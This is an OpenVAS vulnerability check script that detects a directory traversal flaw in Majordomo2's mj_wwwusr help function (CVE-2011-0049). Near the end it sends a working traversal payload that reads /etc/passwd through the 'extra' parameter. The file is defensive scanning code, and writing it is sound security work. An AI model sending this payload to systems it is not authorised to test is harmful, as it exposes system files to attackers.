###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_majordomo2_dir_trav_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Majordomo2 Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.
  Impact Level: Application";
tag_affected = "Majordomo2 Build 20110203 and prior";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the
  'help' parameter in 'mj_wwwusr', which allows attacker to read arbitrary
  files via directory traversal attacks.";
tag_solution = "Upgrade to Majordomo2 Build 20110204 or later.
  For updates refer to http://www.mj2.org/";
tag_summary = "The host is running Majordomo2 and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(801838);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-02-07 15:21:16 +0100 (Mon, 07 Feb 2011)");
  script_bugtraq_id(46127);
  script_cve_id("CVE-2011-0049", "CVE-2011-0063");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Majordomo2 Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "https://sitewat.ch/en/Advisory/View/1");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16103/");
  script_xref(name : "URL" , value : "https://bugzilla.mozilla.org/show_bug.cgi?id=628064");

  script_description(desc);
  script_summary("Determine if Majordomo2 vulnerable to Directory Traversal Attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (cgi_dirs())
{
  ## Send and Recieve the response
  req = http_get (item: string (dir,"/mj_wwwusr"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if('>Majordomo' >< res)
  {
    ## Try attack and check the response to confirm vulnerability
    url = dir + "/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../" +
                "../../../../../../etc/passwd";

    if(http_vuln_check(port:port, url:url, pattern:'root:.*:0:[01]:'))
    {
      security_warning(port:port);
      exit(0);
    }
  }
}
